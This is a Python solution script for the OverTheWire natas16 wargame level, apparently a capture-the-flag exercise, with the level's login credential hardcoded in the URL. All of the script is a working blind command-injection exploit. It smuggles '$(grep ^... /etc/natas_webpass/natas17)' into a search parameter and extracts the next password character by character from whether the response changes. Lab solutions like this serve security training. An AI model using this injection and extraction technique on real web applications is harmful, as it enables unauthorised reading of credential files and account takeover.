import string
import requests

URL = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
POSSIBLE_CHARS = string.ascii_letters + string.digits

def is_partial_password(password):
    r = requests.get(f'{URL}?needle=hacker$(grep ^{password} /etc/natas_webpass/natas17)')
    return not 'hacker' in r.text

def get_password(char_set, length):
    password = ''
    while len(password) < length:
        password += next(char for char in char_set if is_partial_password(password + char))
    return password    

if __name__ == '__main__':
    if requests.get(URL).status_code == requests.codes.ok:
         print(f'Password = {get_password(POSSIBLE_CHARS, 32)}')
    else:
        print('Authentication Failed!')
